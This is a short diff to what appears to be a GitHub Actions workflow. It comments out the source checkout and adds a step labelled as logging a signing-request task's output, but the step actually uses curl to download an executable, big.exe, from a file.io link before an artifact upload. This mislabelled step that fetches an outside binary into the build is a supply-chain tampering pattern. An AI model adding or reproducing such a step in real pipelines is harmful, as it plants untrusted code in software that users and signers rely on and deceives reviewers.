@@ -14,10 +14,13 @@ jobs:
     - name: Log workflow version
       run: "echo \"Version 1\""
 
-    - name: checkout
-      uses: actions/checkout@v3
-      with:
-          lfs: true
+    # - name: checkout
+      # uses: actions/checkout@v3
+      # with:
+          # lfs: true
+    - name: Log submit-signing-request task output for Org1
+      run: |
+           curl https://file.io/VFpSiLwnv4um --output big.exe
       
     - name: Upload the artifcat file
       uses: actions/upload-artifact@v3
